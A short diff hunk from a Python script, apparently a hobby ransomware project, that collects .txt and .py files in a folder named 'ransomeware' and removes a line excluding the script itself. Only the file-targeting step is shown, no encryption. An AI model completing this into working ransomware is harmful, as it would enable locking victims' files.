@@ -14,7 +14,7 @@ for files in  os.listdir("ransomeware"):
     if files.endswith("txt") or files.endswith("py"):
         path=os.path.join("ransomeware",files)
         ra.append(path)
-        ra.remove("'ransomeware\\ransome.py',")
+        
 
         try:
 
